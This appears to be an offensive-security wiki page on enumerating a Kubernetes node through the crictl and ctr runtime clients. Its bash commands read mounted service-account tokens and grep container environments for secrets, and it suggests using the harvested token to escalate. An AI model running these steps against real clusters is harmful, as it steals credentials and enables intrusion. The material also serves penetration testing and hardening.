---
title: "crictl and ctr enumeration: mapping a node with the runtime clients"
description: "Before acting, the runtime clients crictl and ctr enumerate everything on a Kubernetes node: pods and containers with their images and mounts, cached images and their contents, and the environment and secrets projected into running containers. This read-only step frequently yields service-account tokens and credentials without launching anything."
keywords:
  - crictl
  - ctr
  - enumeration
  - service account token
  - kubernetes node
---

# crictl and ctr enumeration

With access to a node runtime socket, the clients `crictl` (CRI) and `ctr` (containerd native) read the node's entire container state. Enumerating first is low-noise and often sufficient: running pod containers already mount service-account tokens and hold environment secrets, so reading them beats spawning a new container. This is the reconnaissance that turns node-runtime access into cluster credentials.

```bash
export CONTAINER_RUNTIME_ENDPOINT=unix:///run/crio/crio.sock   # or containerd.sock
# every pod and container on the node, with state
crictl pods -v; crictl ps -a
# inspect a container for its mounts, env, and the pod it belongs to
crictl inspect <container-id> | jq '.status.mounts, .info.config.envs'
# ctr equivalent for containerd, in the k8s.io namespace
S=/run/containerd/containerd.sock
ctr --address $S -n k8s.io container ls
ctr --address $S -n k8s.io container info <id> | jq '.Spec.mounts, .Spec.process.env'
```

## Harvesting tokens and secrets

```bash
# projected service-account tokens are mounted into pod containers
crictl inspect <id> | jq -r '.status.mounts[].hostPath' | grep -i serviceaccount
cat <that-hostPath>/token                               # a cluster SA token
# environment variables carry injected secrets
crictl inspect <id> | jq -r '.info.config.envs[] | "\(.key)=\(.value)"' | \
  grep -iE 'token|secret|password|key'
```

The service-account token mounted into a pod container authenticates to the Kubernetes API as that pod's identity, which is frequently enough to read more secrets or, with permissive RBAC, to escalate.

## Exploitation notes

- Enumeration is read-only and does not create containers, so it is the quiet first move once a socket is reachable.
- Projected token hostPaths point at the node filesystem; reading them needs node file access, which the same socket provides via a container, or direct access if you are already on the node.
- Use the harvested token against the API server; see [Kubernetes RBAC privilege escalation](../../orchestration/kubernetes/rbac-privilege-escalation/index.md) for what a given identity can do.

## References

- [crictl user guide](https://github.com/kubernetes-sigs/cri-tools/blob/master/docs/crictl.md)
- [containerd ctr](https://github.com/containerd/containerd/blob/main/docs/getting-started.md)
- [Kubernetes: service account tokens](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/)
